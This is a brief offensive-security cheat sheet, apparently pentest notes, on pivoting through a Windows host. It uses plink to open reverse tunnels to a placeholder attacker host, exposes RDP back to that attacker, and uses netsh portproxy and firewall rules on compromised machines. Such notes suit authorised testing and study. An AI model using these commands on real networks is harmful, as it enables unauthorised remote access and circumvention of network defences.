# Port Forwarding with Windows Tools

SSH utilities can be found in `%systemdrive%\Windows\System32\OpenSSH`.
ssh.exe behaves as you'd expect.


## Plink

As we won't always have an openSSH client on windows hosts, it can be good to get an understanding of some alternatives.
PuTTY for the CLI.
It has similar features to openSSH, but without remote dynamic port forwarding.

If you are getting an error about algorithm choice when calling plink, consider getting a newer version from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html).


assuming we have `plink.exe` available on the windows host, we can do remote port forwarding with:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:${EXTERNAL_IP}:${EXTERNAL_PORT} ${ATTACKER_IP} 
```


(note the pipe command which answers `y` to the question about keys. The second time you do it, leave out the piping).
This can also be used to expose RDP:

```
cmd.exe /c echo y | .\plink.exe -ssh -l ${ATTACKER_USER} -pw ${ATTACKER_PW} -R 127.0.0.1:${LISTENING_PORT}:127.0.0.1:3389 ${ATTACKER_IP} 
```

Now, you can do the following from `${ATTACKER_IP}`:

```
xfreerdp /u:${DOMAIN}\\${user} /p:${password} /cert:ignore /v:127.0.0.1:${LISTENING_PORT}
```
## Netsh

Native way of port forwarding from windows (requires admin permissions):
```
netsh interface portproxy add v4tov4 listenport=${OWNED_PORT0} listenaddress=${OWNED_IP0} connectport=${OWNED_PORT1} connectaddress=${OWNED_IP1}
```
If you ever need to add firewall rules to allow traffic to flow through a given port on Windows (also requires admin permissions):
```
netsh advfirewall firewall add rule name="port_forward_ssh_${OWNED_PORT0}" protocol=TCP dir=in localip=${OWNED_IP0} localport=${OWNED_PORT0} action=allow
```
